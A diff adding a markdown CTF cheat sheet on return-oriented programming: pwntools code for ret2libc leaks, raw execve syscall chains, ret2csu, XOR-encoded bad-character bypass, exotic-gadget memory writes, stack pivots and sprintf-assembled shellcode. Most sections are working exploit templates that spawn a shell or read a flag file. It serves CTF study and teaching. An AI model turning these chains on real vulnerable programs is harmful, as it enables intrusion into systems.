@@ -1,0 +1,390 @@
+# CTF Pwn - ROP Chains and Shellcode
+
+## Table of Contents
+- [ROP Chain Building](#rop-chain-building)
+  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
+  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
+  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
+  - [Shell Interaction After execve](#shell-interaction-after-execve)
+- [ret2csu — __libc_csu_init Gadgets (Crypto-Cat)](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
+- [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
+- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
+  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
+  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
+- [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
+- [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
+
+For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
+
+---
+
+## ROP Chain Building
+
+```python
+from pwn import *
+
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop = ROP(elf)
+
+# Common gadgets
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+# Leak libc
+payload = flat(
+    b'A' * offset,
+    pop_rdi,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.symbols['main']
+)
+```
+
+### Two-Stage ret2libc (Leak + Shell)
+
+When exploiting in two stages, choose the return target for stage 2 carefully:
+
+```python
+# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
+payload1 = b'A' * offset
+payload1 += p64(pop_rdi)
+payload1 += p64(elf.got['puts'])
+payload1 += p64(elf.plt['puts'])
+payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
+
+# IMPORTANT: Return target after leak
+# - Returning to main may crash if check_status/setup corrupts stack
+# - Returning to vuln directly may have stack issues
+# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
+#   This sets up a clean stack frame via the CALL instruction
+```
+
+**Leak parsing with no-newline printf:**
+```python
+# If printf("Laundry complete") has no trailing newline,
+# puts() leak appears right after it on the same line:
+# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
+p.recvuntil(b'Laundry complete')
+leaked = p.recvline().strip()
+libc_addr = u64(leaked.ljust(8, b'\x00'))
+```
+
+### Raw Syscall ROP (When system() Fails)
+
+If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:
+
+```python
+# Find gadgets in libc
+libc_rop = ROP(libc)
+pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
+pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
+syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
+
+# execve("/bin/sh", NULL, NULL) = syscall 59
+payload = b'A' * offset
+payload += p64(libc_base + pop_rax)
+payload += p64(59)
+payload += p64(libc_base + pop_rdi)
+payload += p64(libc_base + next(libc.search(b'/bin/sh')))
+payload += p64(libc_base + pop_rsi)
+payload += p64(0)
+payload += p64(libc_base + pop_rdx_rbx)
+payload += p64(0)
+payload += p64(0)  # rbx junk
+payload += p64(libc_base + syscall_ret)
+```
+
+**When to use raw syscall vs libc functions:**
+- `system()` through libc: simplest, but may crash due to stack alignment or CET
+- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
+- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
+- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead
+
+### rdx Control in ROP Chains
+
+After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.
+
+**Solutions:**
+1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
+2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
+   ```python
+   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
+   # Set rbp first so rbp-0x40 points to target buffer:
+   POP_RBP_RET = 0x40113d
+   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
+
+   payload += p64(POP_RBP_RET)
+   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
+   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
+   # WARNING: After read, code continues to printf + leave;ret
+   # leave sets rsp=rbp, so you get a stack pivot to rbp!
+   ```
+3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
+
+### Shell Interaction After execve
+
+After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.
+
+```python
+p.send(payload)  # Trigger execve
+
+# Wait for shell to initialize before sending commands
+import time
+time.sleep(1)
+p.sendline(b'id')
+time.sleep(0.5)
+result = p.recv(timeout=3)
+
+# For flag retrieval:
+p.sendline(b'cat /flag* flag* 2>/dev/null')
+time.sleep(0.5)
+flag = p.recv(timeout=3)
+
+# DON'T pipe commands via stdin when using pwntools - they get consumed
+# by earlier read() calls. Use explicit sendline() after delays instead.
+```
+
+## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)
+
+**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.
+
+**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
+```asm
+pop rbx        ; 0
+pop rbp        ; 1
+pop r12        ; function pointer (address of GOT entry)
+pop r13        ; edi value
+pop r14        ; rsi value
+pop r15        ; rdx value
+ret
+```
+
+**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
+```asm
+mov rdx, r15   ; rdx = r15
+mov rsi, r14   ; rsi = r14
+mov edi, r13d  ; edi = r13 (32-bit!)
+call [r12 + rbx*8]  ; call function pointer
+add rbx, 1
+cmp rbp, rbx
+jne .loop      ; loop if rbx != rbp
+; falls through to gadget 1 pop chain
+```
+
+**Exploit pattern:**
+```python
+csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
+csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL
+
+payload = flat(
+    b'A' * offset,
+    csu_pop,
+    0,            # rbx = 0 (index)
+    1,            # rbp = 1 (loop count, must equal rbx+1)
+    elf.got['puts'],  # r12 = function to call (GOT entry)
+    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
+    0xcafebabe,   # r14 → rsi (second arg)
+    0x12345678,   # r15 → rdx (third arg)
+    csu_call,     # trigger mov + call
+    b'\x00' * 56, # padding for the 7 pops after call returns
+    next_gadget,  # return address after csu completes
+)
+```
+
+**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.
+
+**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.
+
+---
+
+## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)
+
+**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).
+
+**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.
+
+**Required gadgets:**
+```asm
+pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
+xor [r15], r14; ret            ; XOR memory at r15 with r14
+mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
+```
+
+**Exploit pattern:**
+```python
+data_section = elf.symbols['__data_start']  # or .data address
+xor_key = 2  # simple key that removes bad chars
+
+def xor_bytes(data, key):
+    return bytes(b ^ key for b in data)
+
+target = b"flag.txt"
+encoded = xor_bytes(target, xor_key)
+
+payload = b'A' * offset
+
+# Write XOR'd data in 8-byte chunks
+for i in range(0, len(encoded), 8):
+    chunk = encoded[i:i+8].ljust(8, b'\x00')
+    payload += flat(
+        pop_r14_r15,
+        chunk,                    # XOR'd data
+        data_section + i,         # destination address
+        mov_r15_r14,              # write to memory
+    )
+
+# XOR each chunk back to recover original
+for i in range(0, len(target), 8):
+    payload += flat(
+        pop_r14_r15,
+        p64(xor_key),             # XOR key
+        data_section + i,         # target address
+        xor_r15_r14,              # decode in place
+    )
+
+# Now data_section contains "flag.txt" — use it as argument
+payload += flat(pop_rdi, data_section, elf.plt['print_file'])
+```
+
+**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.
+
+---
+
+## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)
+
+**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.
+
+### 64-bit: BEXTR + XLAT + STOSB
+
+**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.
+
+```python
+# Gadgets from questionableGadgets section of binary
+xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
+bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
+                                                     # bextr rbx, rcx, rdx; ret
+stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret
+
+data_section = elf.symbols.__data_start
+
+# Write "flag.txt" byte by byte
+for i, char in enumerate(b"flag.txt"):
+    # Find address of char in binary's read-only data
+    char_addr = next(elf.search(bytes([char])))
+
+    # BEXTR extracts rbx from rcx using rdx as control
+    # rcx = char_addr - 0x3ef2 (compensate for add)
+    # rdx = 0x4000 (extract 64 bits starting at bit 0)
+    payload += flat(
+        bextr_ret,
+        0x4000,                    # rdx (BEXTR control: start=0, len=64)
+        char_addr - 0x3ef2,        # rcx (offset compensated)
+        xlat_ret,                  # al = byte at [rbx + al]
+        pop_rdi,
+        data_section + i,
+        stosb_ret,                 # [rdi] = al; rdi++
+    )
+```
+
+### 32-bit: PEXT (Parallel Bits Extract)
+
+**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.
+
+```python
+# Gadgets
+pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
+                                                      # pext edx,ebx,eax; ...ret
+bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
+xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret
+
+# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
+def find_mask(target_byte, source=0xb0bababa):
+    """Find 32-bit mask that extracts target_byte from source via PEXT."""
+    source_bits = [(source >> i) & 1 for i in range(32)]
+    target_bits = [(target_byte >> i) & 1 for i in range(8)]
+    # Select 8 bits from source that match target bits
+    mask = 0
+    matched = 0
+    for i in range(32):
+        if matched < 8 and source_bits[i] == target_bits[matched]:
+            mask |= (1 << i)
+            matched += 1
+    return mask if matched == 8 else None
+```
+
+**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.
+
+---
+
+## Stack Pivot via xchg rax,esp (Crypto-Cat)
+
+**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.
+
+**Two-stage pattern:**
+```python
+# Stage 1: Program provides a heap address where it wrote user data
+pivot_addr = int(io.recvline(), 16)
+
+# Prepare ROP chain at the pivot address (via earlier input)
+stage2_rop = flat(
+    pop_rdi, elf.got['puts'],
+    elf.plt['puts'],             # leak libc
+    elf.symbols['main'],         # return to main for stage 3
+)
+io.send(stage2_rop)             # Written to pivot_addr by program
+
+# Stage 2: Overflow with stack pivot
+xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
+pop_rax = elf.symbols.usefulGadgets            # pop rax; ret
+
+payload = flat(
+    b'A' * offset,
+    pop_rax,
+    pivot_addr,         # load pivot address into rax
+    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
+)
+```
+
+**Why xchg vs. leave;ret:**
+- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
+- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
+- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)
+
+**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.
+
+---
+
+## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)
+
+**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.
+
+```python
+from pwn import *
+
+# Step 1: Scan executable for addresses containing each needed byte
+exe_data = open('binary', 'rb').read()
+byte_addrs = {}  # Maps byte value -> address in executable
+for c in range(256):
+    for i in range(len(exe_data)):
+        addr = exe_base + i
+        if exe_data[i] == c and not has_bad_chars(p32(addr)):
+            byte_addrs[c] = addr
+            break
+
+# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
+rop = b''
+for i, byte in enumerate(shellcode):
+    rop += p32(sprintf_plt)
+    rop += p32(pop3ret)           # Clean 3 args
+    rop += p32(bss_addr + i)     # Destination
+    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
+    rop += p32(0)                # Unused arg
+
+# Step 3: Jump to assembled shellcode on BSS
+rop += p32(bss_addr)
+```
+
+**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.
